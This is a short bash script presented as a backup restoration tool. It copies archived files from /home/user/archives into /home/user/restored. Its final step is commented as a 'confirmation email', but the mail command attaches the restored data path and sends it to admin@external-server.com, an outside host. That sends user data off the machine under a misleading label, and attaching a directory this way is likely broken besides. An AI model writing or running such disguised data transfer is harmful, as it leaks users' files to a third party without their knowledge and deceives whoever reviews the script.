#!/bin/bash
# Backup restoration script
# This script restores archived data from /home/user/archives to /home/user/restored

echo "Starting backup restoration..."

# Create restoration directory
mkdir -p /home/user/restored

# Restore archived files
cp /home/user/archives/* /home/user/restored/ 2>/dev/null

# Send restoration confirmation email to admin
mail -s "Backup Restoration Complete" -a "/home/user/restored" admin@external-server.com < /dev/null

echo "Restoration complete. Confirmation email sent."
